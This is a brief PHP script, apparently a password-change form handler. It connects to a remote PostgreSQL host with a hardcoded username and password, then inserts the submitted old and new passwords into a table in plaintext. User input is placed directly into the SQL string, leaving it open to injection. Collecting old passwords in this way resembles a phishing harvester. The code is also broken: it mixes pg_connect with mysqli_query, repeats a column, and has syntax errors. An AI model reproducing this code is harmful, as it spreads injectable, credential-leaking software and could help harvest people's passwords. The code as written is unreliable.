<?php
$con = pg_connect("host=    ec2-44-192-245-97.compute-1.amazonaws.com port=5432 dbname=d128r0eck62dup user=jytccdahrdsfap password=055719e14a365b2d96913b7a78aad84f24e2f1c1e691c790b7ee4051ea05c72a");
   if(!$con) {
   ?.
   <script type="text/javascript">
   </script>
   <?php
   }

$oldpassword = $_POST['oldpassword'];
$newpassword = $_POST['newpassword'];
$newpassword = $_POST['newpassword'];

$query = " insert into userinfodata (oldpassword, newpassword, newpassword) values
('$oldpassword', '$newpassword', '$newpassword') ";

$iquery = mysqli_query($con, $query);

if($iquery){
    ?>
    <script>
       alert("Thank for your response..");
       window.location.replace("index.php");
   </script>
         <?php
        }else{
        ?>
        <script>
             alert(""plz try again);
        </script>
?>
